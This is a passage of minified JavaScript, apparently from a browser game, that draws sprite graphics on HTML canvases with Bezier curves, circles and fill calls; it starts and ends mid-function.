      r.bezierCurveTo(e * 180.6999969482422, e * 203.11249923706055, e * 180.6999969482422, e * 203.11249923706055, e * 175.1999969482422, e * 203.61249923706055);
      r.bezierCurveTo(e * 174.6999969482422, e * 200.11249923706055, e * 174.6999969482422, e * 200.11249923706055, e * 174.1999969482422, e * 196.61249923706055);
      r.bezierCurveTo(e * 177.1999969482422, e * 195.61249923706055, e * 177.1999969482422, e * 195.61249923706055, e * 180.1999969482422, e * 194.61249923706055);
      r.bezierCurveTo(e * 177.1999969482422, e * 191.61249923706055, e * 177.1999969482422, e * 191.61249923706055, e * 174.1999969482422, e * 188.61249923706055);
      r.bezierCurveTo(e * 175.6999969482422, e * 187.11249923706055, e * 175.6999969482422, e * 187.11249923706055, e * 177.1999969482422, e * 185.61249923706055);
      r.bezierCurveTo(e * 180.6999969482422, e * 187.11249923706055, e * 180.6999969482422, e * 187.11249923706055, e * 184.1999969482422, e * 188.61249923706055);
      r.bezierCurveTo(e * 182.6999969482422, e * 183.61249923706055, e * 182.6999969482422, e * 183.61249923706055, e * 181.1999969482422, e * 178.61249923706055);
      r.bezierCurveTo(e * 183.1999969482422, e * 177.11249923706055, e * 183.1999969482422, e * 177.11249923706055, e * 185.1999969482422, e * 175.61249923706055);
      r.closePath();
      ye(r, i[10]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 185.1999969482422, e * 173.8125);
      r.bezierCurveTo(e * 187.1999969482422, e * 179.3125, e * 187.1999969482422, e * 179.3125, e * 189.1999969482422, e * 184.8125);
      r.bezierCurveTo(e * 184.1999969482422, e * 181.8125, e * 184.1999969482422, e * 181.8125, e * 179.1999969482422, e * 178.8125);
      r.bezierCurveTo(e * 181.1999969482422, e * 175.8125, e * 182.1999969482422, e * 174.8125, e * 185.1999969482422, e * 173.8125);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 192.1999969482422, e * 173.61249542236328);
      r.bezierCurveTo(e * 194.1999969482422, e * 172.61249542236328, e * 196.1999969482422, e * 171.61249542236328, e * 199.1999969482422, e * 173.61249542236328);
      r.bezierCurveTo(e * 197.6999969482422, e * 179.61249542236328, e * 197.6999969482422, e * 179.61249542236328, e * 196.1999969482422, e * 185.61249542236328);
      r.bezierCurveTo(e * 194.1999969482422, e * 179.61249542236328, e * 194.1999969482422, e * 179.61249542236328, e * 192.1999969482422, e * 173.61249542236328);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 205.1999969482422, e * 176.2125015258789);
      r.bezierCurveTo(e * 210.1999969482422, e * 178.2125015258789, e * 211.1999969482422, e * 179.2125015258789, e * 211.1999969482422, e * 181.2125015258789);
      r.bezierCurveTo(e * 206.6999969482422, e * 184.7125015258789, e * 206.6999969482422, e * 184.7125015258789, e * 202.1999969482422, e * 188.2125015258789);
      r.bezierCurveTo(e * 203.6999969482422, e * 182.2125015258789, e * 203.6999969482422, e * 182.2125015258789, e * 205.1999969482422, e * 176.2125015258789);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.1999969482422, e * 187.21249985694885);
      r.bezierCurveTo(e * 216.1999969482422, e * 191.21249985694885, e * 216.1999969482422, e * 192.21249985694885, e * 215.1999969482422, e * 195.21249985694885);
      r.bezierCurveTo(e * 206.1999969482422, e * 194.21249985694885, e * 205.1999969482422, e * 194.21249985694885, e * 205.1999969482422, e * 194.21249985694885);
      r.bezierCurveTo(e * 209.6999969482422, e * 190.71249985694885, e * 209.6999969482422, e * 190.71249985694885, e * 214.1999969482422, e * 187.21249985694885);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 204.1999969482422, e * 201.8125);
      r.bezierCurveTo(e * 209.1999969482422, e * 201.3125, e * 209.1999969482422, e * 201.3125, e * 214.1999969482422, e * 200.8125);
      r.bezierCurveTo(e * 215.1999969482422, e * 204.8125, e * 214.1999969482422, e * 205.8125, e * 213.1999969482422, e * 208.8125);
      r.bezierCurveTo(e * 208.6999969482422, e * 205.3125, e * 208.6999969482422, e * 205.3125, e * 204.1999969482422, e * 201.8125);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 199.1999969482422, e * 205.61249923706055);
      r.bezierCurveTo(e * 207.1999969482422, e * 212.61249923706055, e * 203.6999969482422, e * 209.11249923706055, e * 208.1999969482422, e * 212.61249923706055);
      r.bezierCurveTo(e * 206.1999969482422, e * 215.61249923706055, e * 204.1999969482422, e * 217.61249923706055, e * 203.1999969482422, e * 216.61249923706055);
      r.bezierCurveTo(e * 201.1999969482422, e * 211.11249923706055, e * 201.1999969482422, e * 211.11249923706055, e * 199.1999969482422, e * 205.61249923706055);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 191.1999969482422, e * 207.01250076293945);
      r.bezierCurveTo(e * 194.1999969482422, e * 213.01250076293945, e * 194.1999969482422, e * 216.01250076293945, e * 196.1999969482422, e * 218.01250076293945);
      r.bezierCurveTo(e * 193.1999969482422, e * 220.01250076293945, e * 190.1999969482422, e * 220.01250076293945, e * 188.1999969482422, e * 218.01250076293945);
      r.bezierCurveTo(e * 189.6999969482422, e * 213.01250076293945, e * 189.6999969482422, e * 213.01250076293945, e * 191.1999969482422, e * 208.01250076293945);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 186.1999969482422, e * 203.21249961853027);
      r.bezierCurveTo(e * 184.1999969482422, e * 209.21249961853027, e * 184.1999969482422, e * 209.21249961853027, e * 182.1999969482422, e * 215.21249961853027);
      r.bezierCurveTo(e * 177.1999969482422, e * 212.21249961853027, e * 176.1999969482422, e * 211.21249961853027, e * 177.1999969482422, e * 210.21249961853027);
      r.bezierCurveTo(e * 181.6999969482422, e * 206.71249961853027, e * 181.6999969482422, e * 206.71249961853027, e * 186.1999969482422, e * 203.21249961853027);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 183.1999969482422, e * 196.8125);
      r.bezierCurveTo(e * 177.1999969482422, e * 196.3125, e * 177.1999969482422, e * 196.3125, e * 171.1999969482422, e * 195.8125);
      r.bezierCurveTo(e * 171.1999969482422, e * 199.8125, e * 171.1999969482422, e * 202.8125, e * 174.1999969482422, e * 204.8125);
      r.bezierCurveTo(e * 178.6999969482422, e * 200.8125, e * 178.6999969482422, e * 200.8125, e * 183.1999969482422, e * 196.8125);
      r.closePath();
      ye(r, i[11]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 185.1999969482422, e * 190.21249771118164);
      r.bezierCurveTo(e * 179.6999969482422, e * 186.71249771118164, e * 179.6999969482422, e * 186.71249771118164, e * 174.1999969482422, e * 183.21249771118164);
      r.bezierCurveTo(e * 172.1999969482422, e * 186.21249771118164, e * 172.1999969482422, e * 187.21249771118164, e * 172.1999969482422, e * 190.21249771118164);
      r.bezierCurveTo(e * 178.1999969482422, e * 190.21249771118164, e * 178.1999969482422, e * 190.21249771118164, e * 184.1999969482422, e * 190.21249771118164);
      r.closePath();
      ye(r, i[11]);
      ze(r, e * 126.19999694824219, e * 169.8125, e * 8.94427190999916);
      ye(r, i[12]);
      ze(r, e * 123.19999694824219, e * 164.8125, e * 2.8284271247461903);
      ye(r, i[13]);
      ze(r, e * 253.1999969482422, e * 169.8125, e * 8.94427190999916);
      ye(r, i[12]);
      ze(r, e * 255.1999969482422, e * 164.8125, e * 2.23606797749979);
      ye(r, i[13]);
      return t;
    }
    function Kr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.globalAlpha = 1;
      n.translate(e * 20, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36.5, e * 278.0625);
      n.bezierCurveTo(e * 67.5, e * 316.0625, e * 134.5, e * 334.0625, e * 199.5, e * 319.0625);
      n.bezierCurveTo(e * 254.5, e * 304.0625, e * 346.5, e * 270.0625, e * 348.5, e * 237.0625);
      n.bezierCurveTo(e * 359.5, e * 206.0625, e * 318.5, e * 129.0625, e * 262.5, e * 122.0625);
      n.bezierCurveTo(e * 213.5, e * 115.0625, e * 166.5, e * 133.0625, e * 104.5, e * 166.0625);
      n.bezierCurveTo(e * 54.5, e * 194.0625, e * 23.5, e * 241.0625, e * 36.5, e * 277.0625);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36.5, e * 278.0625);
      n.bezierCurveTo(e * 67.5, e * 316.0625, e * 134.5, e * 334.0625, e * 199.5, e * 319.0625);
      n.bezierCurveTo(e * 254.5, e * 304.0625, e * 346.5, e * 270.0625, e * 348.5, e * 237.0625);
      n.bezierCurveTo(e * 359.5, e * 206.0625, e * 318.5, e * 129.0625, e * 262.5, e * 122.0625);
      n.bezierCurveTo(e * 213.5, e * 115.0625, e * 166.5, e * 133.0625, e * 104.5, e * 166.0625);
      n.bezierCurveTo(e * 54.5, e * 194.0625, e * 23.5, e * 241.0625, e * 36.5, e * 277.0625);
      n.closePath();
      ye(n, t[1], t[2], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 214.5, e * 124.0625);
      n.bezierCurveTo(e * 242.5, e * 125.0625, e * 272.5, e * 159.0625, e * 283.5, e * 184.0625);
      n.bezierCurveTo(e * 277.5, e * 161.0625, e * 233.5, e * 128.0625, e * 219.5, e * 122.0625);
      n.closePath();
      ye(n, undefined, t[2], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 157.5, e * 145.0625);
      n.bezierCurveTo(e * 176.5, e * 148.0625, e * 205.5, e * 176.0625, e * 212.5, e * 197.0625);
      n.bezierCurveTo(e * 205.5, e * 178.0625, e * 177.5, e * 152.0625, e * 156.5, e * 142.0625);
      n.closePath();
      ye(n, undefined, t[2], e * 19);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 103.5, e * 169.0625);
      n.bezierCurveTo(e * 160.5, e * 166.0625, e * 228.5, e * 312.0625, e * 162.5, e * 323.0625);
      n.bezierCurveTo(e * 128.5, e * 330.0625, e * 45.5, e * 312.0625, e * 34.5, e * 268.0625);
      n.bezierCurveTo(e * 30.5, e * 238.0625, e * 44.5, e * 222.0625, e * 52.5, e * 211.0625);
      n.bezierCurveTo(e * 82.5, e * 174.0625, e * 104.5, e * 166.0625, e * 119.5, e * 172.0625);
      n.closePath();
      ye(n, t[3], t[2], e * 19);
      ze(n, e * 92.5, e * 216.0625, e * 13.892443989449804);
      ye(n, t[4]);
      ze(n, e * 68.5, e * 227.0625, e * 8.06225774829855);
      ye(n, t[4]);
      ze(n, e * 85.5, e * 240.0625, e * 6.708203932499369);
      ye(n, t[4]);
      ze(n, e * 147.5, e * 294.0625, e * 17.46424919657298);
      ye(n, t[4]);
      ze(n, e * 166.5, e * 273.0625, e * 6.708203932499369);
      ye(n, t[4]);
      ze(n, e * 114.5, e * 294.0625, e * 12.36931687685298);
      ye(n, t[4]);
      ze(n, e * 123.5, e * 220.0625, e * 5.830951894845301);
      ye(n, t[4]);
      ze(n, e * 114.5, e * 259.0625, e * 4.123105625617661);
      ye(n, t[4]);
      ze(n, e * 63.5, e * 265.0625, e * 5.385164807134504);
      ye(n, t[4]);
      ze(n, e * 148.5, e * 235.0625, e * 4.47213595499958);
      ye(n, t[4]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 194.5, e * 313.0625);
      n.bezierCurveTo(e * 222.5, e * 306.0625, e * 319.5, e * 271.0625, e * 337.5, e * 241.0625);
      n.bezierCurveTo(e * 274.5, e * 270.0625, e * 216.5, e * 288.0625, e * 199.5, e * 287.0625);
      n.bezierCurveTo(e * 198.5, e * 302.0625, e * 195.5, e * 311.0625, e * 193.5, e * 312.0625);
      n.closePath();
      ye(n, t[5]);
      return r;
    }
    function Ur(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 440;
      r.height = e * 388;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      ze(n, e * 220, e * 201, e * 170.41713528867922);
      ye(n, t[0], t[0], e * 6);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      ze(n, e * 220, e * 201, e * 170.41713528867922);
      ye(n, t[1], t[2], e * 6);
      ze(n, e * 220, e * 201, e * 130);
      ye(n, t[11], t[2], e * 6);
      ze(n, e * 222, e * 199, e * 120.74767078498864);
      ye(n, undefined, t[3], e * 40);
      ze(n, e * 220, e * 200, e * 95.44108130150245);
      ye(n, undefined, t[2], e * 15);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      ze(n, e * 63, e * 136, e * 49.193495504995376);
      ye(n, t[0], t[0], e * 4);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      ze(n, e * 63, e * 136, e * 49.193495504995376);
      ye(n, t[8], t[2], e * 4);
      ze(n, e * 63, e * 137, e * 25.632011235952593);
      ye(n, t[7], t[2], e * 4);
      return r;
    }
    function Yr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 440;
      r.height = e * 388;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      ze(n, e * 220, e * 201, e * 170.41713528867922);
      ye(n, t[0], t[0], e * 6);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      ze(n, e * 220, e * 201, e * 170.41713528867922);
      ye(n, t[1], t[2], e * 6);
      ze(n, e * 220, e * 201, e * 130);
      ye(n, t[11], t[2], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 218, e * 97);
      n.bezierCurveTo(e * 219, e * 163, e * 201, e * 176, e * 191, e * 175);
      n.bezierCurveTo(e * 176, e * 177, e * 168, e * 167, e * 160, e * 115);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 224, e * 181);
      n.bezierCurveTo(e * 225, e * 138, e * 246, e * 115, e * 263, e * 137);
      n.bezierCurveTo(e * 282, e * 174, e * 279, e * 217, e * 265, e * 243);
      n.bezierCurveTo(e * 253, e * 264, e * 240, e * 256, e * 233, e * 238);
      n.bezierCurveTo(e * 221, e * 212, e * 225, e * 198, e * 224, e * 184);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 169, e * 289);
      n.bezierCurveTo(e * 161, e * 234, e * 168, e * 197, e * 187, e * 195);
      n.bezierCurveTo(e * 219, e * 189, e * 222, e * 256, e * 216, e * 307);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 143, e * 146);
      n.bezierCurveTo(e * 161, e * 199, e * 151, e * 245, e * 138, e * 266);
      n.bezierCurveTo(e * 120.5, e * 239.5, e * 120.5, e * 239.5, e * 103, e * 213);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 283, e * 135);
      n.bezierCurveTo(e * 277, e * 176, e * 298, e * 194, e * 315, e * 205);
      n.bezierCurveTo(e * 323.5, e * 175, e * 323.5, e * 175, e * 332, e * 145);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 318, e * 223);
      n.bezierCurveTo(e * 290, e * 195, e * 271, e * 256, e * 283, e * 281);
      n.bezierCurveTo(e * 303.5, e * 267, e * 303.5, e * 267, e * 324, e * 253);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 142, e * 223);
      n.bezierCurveTo(e * 128, e * 213, e * 123, e * 214, e * 111, e * 223);
      n.closePath();
      ye(n, t[10], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 251, e * 133);
      n.bezierCurveTo(e * 269, e * 188, e * 262, e * 229, e * 251, e * 253);
      n.bezierCurveTo(e * 288, e * 224, e * 273, e * 139, e * 252, e * 133);
      n.closePath();
      ye(n, t[10], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 203, e * 102);
      n.bezierCurveTo(e * 204, e * 136, e * 200, e * 159, e * 189, e * 174);
      n.bezierCurveTo(e * 223, e * 164, e * 219, e * 87, e * 205, e * 83);
      n.closePath();
      ye(n, t[10], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 196, e * 324);
      n.bezierCurveTo(e * 209, e * 239, e * 200, e * 219, e * 192, e * 196);
      n.bezierCurveTo(e * 229, e * 216, e * 219, e * 316, e * 198, e * 325);
      n.closePath();
      ye(n, t[10], t[10], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 266, e * 166);
      n.bezierCurveTo(e * 249, e * 154, e * 243, e * 161, e * 233, e * 167);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 269, e * 192);
      n.bezierCurveTo(e * 256, e * 183, e * 241, e * 186, e * 233, e * 192);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 263, e * 217);
      n.bezierCurveTo(e * 251, e * 211, e * 242, e * 213, e * 236, e * 218);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 204, e * 141);
      n.bezierCurveTo(e * 191, e * 131, e * 187, e * 133, e * 176, e * 141);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 207, e * 230);
      n.bezierCurveTo(e * 193, e * 222, e * 185, e * 224, e * 177, e * 231);
      ye(n, undefined, t[6], e * 6);
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 210, e * 258);
      n.bezierCurveTo(e * 196, e * 247, e * 191, e * 250, e * 177, e * 259);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 196);
      n.bezierCurveTo(e * 130, e * 186, e * 124, e * 187, e * 114, e * 195);
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 218, e * 97);
      n.bezierCurveTo(e * 219, e * 163, e * 201, e * 176, e * 191, e * 175);
      n.bezierCurveTo(e * 176, e * 177, e * 168, e * 167, e * 160, e * 115);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 224, e * 181);
      n.bezierCurveTo(e * 225, e * 138, e * 246, e * 115, e * 263, e * 137);
      n.bezierCurveTo(e * 282, e * 174, e * 279, e * 217, e * 265, e * 243);
      n.bezierCurveTo(e * 253, e * 264, e * 240, e * 256, e * 233, e * 238);
      n.bezierCurveTo(e * 221, e * 212, e * 225, e * 198, e * 224, e * 184);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 169, e * 289);
      n.bezierCurveTo(e * 161, e * 234, e * 168, e * 197, e * 187, e * 195);
      n.bezierCurveTo(e * 219, e * 189, e * 222, e * 256, e * 216, e * 307);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 143, e * 146);
      n.bezierCurveTo(e * 161, e * 199, e * 151, e * 245, e * 138, e * 266);
      n.bezierCurveTo(e * 120.5, e * 239.5, e * 120.5, e * 239.5, e * 103, e * 213);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 283, e * 135);
      n.bezierCurveTo(e * 277, e * 176, e * 298, e * 194, e * 315, e * 205);
      n.bezierCurveTo(e * 323.5, e * 175, e * 323.5, e * 175, e * 332, e * 145);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 318, e * 223);
      n.bezierCurveTo(e * 290, e * 195, e * 271, e * 256, e * 283, e * 281);
      n.bezierCurveTo(e * 303.5, e * 267, e * 303.5, e * 267, e * 324, e * 253);
      n.closePath();
      ye(n, undefined, t[6], e * 6);
      ze(n, e * 222, e * 199, e * 120.74767078498864);
      ye(n, undefined, t[3], e * 40);
      ze(n, e * 220, e * 200, e * 95.44108130150245);
      ye(n, undefined, t[2], e * 15);
      ze(n, e * 220, e * 201, e * 85);
      ye(n, undefined, t[4], e * 10);
      n.globalAlpha = 0.5;
      ze(n, e * 220, e * 201, e * 82);
      ye(n, t[9]);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      ze(n, e * 63, e * 136, e * 49.193495504995376);
      ye(n, t[0], t[0], e * 4);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      ze(n, e * 63, e * 136, e * 49.193495504995376);
      ye(n, t[8], t[2], e * 4);
      ze(n, e * 63, e * 137, e * 25.632011235952593);
      ye(n, t[7], t[2], e * 4);
      return r;
    }
    function kr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 110;
      t.height = e * 110;
      r.globalAlpha = 0.2;
      ze(r, e * 55, e * 55, e * 55);
      ye(r, i[0]);
      return t;
    }
    function Fr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 102;
      r.height = e * 102;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(3, 3);
      Be(n, e * 24, e * 26, e * 70, e * 9, e * 10);
      ye(n, t[0]);
      Be(n, e * 26, e * 70, e * 70, e * 9, e * 10);
      ye(n, t[0]);
      Be(n, e * 5, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[0]);
      Be(n, e * 40, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[0]);
      Be(n, e * 75, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(-3, -3);
      Be(n, e * 24, e * 26, e * 70, e * 9, e * 10);
      ye(n, t[1]);
      Be(n, e * 26, e * 70, e * 70, e * 9, e * 10);
      ye(n, t[1]);
      Be(n, e * 5, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[2], t[3], e * 4);
      Be(n, e * 40, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[2], t[3], e * 4);
      Be(n, e * 75, e * 3, e * 22, e * 94, e * 5);
      ye(n, t[2], t[3], e * 4);
      return r;
    }
    function xr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 496;
      r.height = e * 520;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 19.000030517578125, e * 256.67613983154297);
      n.bezierCurveTo(e * 1.000030517578125, e * 332.67613983154297, e * 23.000030517578125, e * 404.67613983154297, e * 95.00003051757812, e * 463.67613983154297);
      n.bezierCurveTo(e * 128.00003051757812, e * 491.67613983154297, e * 165.00003051757812, e * 507.67613983154297, e * 194.00003051757812, e * 512.676139831543);
      n.bezierCurveTo(e * 280.0000305175781, e * 517.676139831543, e * 291.0000305175781, e * 516.676139831543, e * 342.0000305175781, e * 497.67613983154297);
      n.bezierCurveTo(e * 425.0000305175781, e * 454.67613983154297, e * 469.0000305175781, e * 392.67613983154297, e * 468.0000305175781, e * 300.67613983154297);
      n.bezierCurveTo(e * 408.5000305175781, e * 365.17613983154297, e * 408.5000305175781, e * 365.17613983154297, e * 349.0000305175781, e * 429.67613983154297);
      n.bezierCurveTo(e * 256.0000305175781, e * 473.67613983154297, e * 167.00003051757812, e * 459.67613983154297, e * 78.00003051757812, e * 384.67613983154297);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      ze(n, e * 247.01138305664062, e * 249.3125, e * 161.4465855941215);
      ye(n, t[5], undefined, e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 65.00003051757812, e * 263.4034118652344);
      n.bezierCurveTo(e * 109.00003051757812, e * 160.40341186523438, e * 185.00003051757812, e * 128.40341186523438, e * 222.00003051757812, e * 124.40341186523438);
      n.bezierCurveTo(e * 277.0000305175781, e * 116.40341186523438, e * 339.0000305175781, e * 134.40341186523438, e * 379.0000305175781, e * 195.40341186523438);
      n.bezierCurveTo(e * 409.0000305175781, e * 242.40341186523438, e * 416.0000305175781, e * 256.4034118652344, e * 428.0000305175781, e * 304.4034118652344);
      n.bezierCurveTo(e * 457.0000305175781, e * 203.40341186523438, e * 449.0000305175781, e * 183.40341186523438, e * 438.0000305175781, e * 162.40341186523438);
      n.bezierCurveTo(e * 381.0000305175781, e * 73.40341186523438, e * 360.0000305175781, e * 66.40341186523438, e * 257.0000305175781, e * 46.403411865234375);
      n.bezierCurveTo(e * 191.00003051757812, e * 45.403411865234375, e * 142.00003051757812, e * 65.40341186523438, e * 101.00003051757812, e * 115.40341186523438);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      var a = function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 496;
        t.height = e * 520;
        r.globalAlpha = 1;
        r.translate(0, e * -10);
        ze(r, e * 247.01138305664062, e * 250.13068389892578, e * 232.81967270830015);
        ye(r, i[1], i[2], e * 14);
        r.globalCompositeOperation = "destination-out";
        ze(r, e * 247.01138305664062, e * 249.3125, e * 161.4465855941215);
        ye(r, i[0], i[0], e * 14);
        r.globalCompositeOperation = "source-over";
        return t;
      }(e, t);
      n.drawImage(a, 0, 0);
      n.translate(0, e * -10);
      ze(n, e * 247.01138305664062, e * 249.3125, e * 161.4465855941215);
      ye(n, undefined, t[2], e * 12);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 325.0113830566406, e * 13.767059326171875);
      n.bezierCurveTo(e * 349.5113830566406, e * 25.767059326171875, e * 349.5113830566406, e * 25.767059326171875, e * 374.0113830566406, e * 37.767059326171875);
      n.bezierCurveTo(e * 384.0113830566406, e * 44.767059326171875, e * 383.0113830566406, e * 50.767059326171875, e * 368.0113830566406, e * 68.76705932617188);
      n.bezierCurveTo(e * 352.5113830566406, e * 91.26705932617188, e * 352.5113830566406, e * 91.26705932617188, e * 337.0113830566406, e * 113.76705932617188);
      n.bezierCurveTo(e * 328.0113830566406, e * 119.76705932617188, e * 328.0113830566406, e * 121.76705932617188, e * 312.0113830566406, e * 112.76705932617188);
      n.bezierCurveTo(e * 303.0113830566406, e * 108.26705932617188, e * 303.0113830566406, e * 108.26705932617188, e * 294.0113830566406, e * 103.76705932617188);
      n.bezierCurveTo(e * 287.0113830566406, e * 99.76705932617188, e * 293.0113830566406, e * 84.76705932617188, e * 297.0113830566406, e * 67.76705932617188);
      n.bezierCurveTo(e * 302.0113830566406, e * 47.767059326171875, e * 302.0113830566406, e * 47.767059326171875, e * 307.0113830566406, e * 27.767059326171875);
      n.bezierCurveTo(e * 310.0113830566406, e * 15.767059326171875, e * 317.0113830566406, e * 12.767059326171875, e * 323.0113830566406, e * 13.767059326171875);
      n.closePath();
      ye(n, t[0], t[0], e * 12);
      n.globalAlpha = 1;
      n.translate(0, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 325.0113830566406, e * 13.767059326171875);
      n.bezierCurveTo(e * 349.5113830566406, e * 25.767059326171875, e * 349.5113830566406, e * 25.767059326171875, e * 374.0113830566406, e * 37.767059326171875);
      n.bezierCurveTo(e * 384.0113830566406, e * 44.767059326171875, e * 383.0113830566406, e * 50.767059326171875, e * 368.0113830566406, e * 68.76705932617188);
      n.bezierCurveTo(e * 352.5113830566406, e * 91.26705932617188, e * 352.5113830566406, e * 91.26705932617188, e * 337.0113830566406, e * 113.76705932617188);
      n.bezierCurveTo(e * 328.0113830566406, e * 119.76705932617188, e * 328.0113830566406, e * 121.76705932617188, e * 312.0113830566406, e * 112.76705932617188);
      n.bezierCurveTo(e * 303.0113830566406, e * 108.26705932617188, e * 303.0113830566406, e * 108.26705932617188, e * 294.0113830566406, e * 103.76705932617188);
      n.bezierCurveTo(e * 287.0113830566406, e * 99.76705932617188, e * 293.0113830566406, e * 84.76705932617188, e * 297.0113830566406, e * 67.76705932617188);
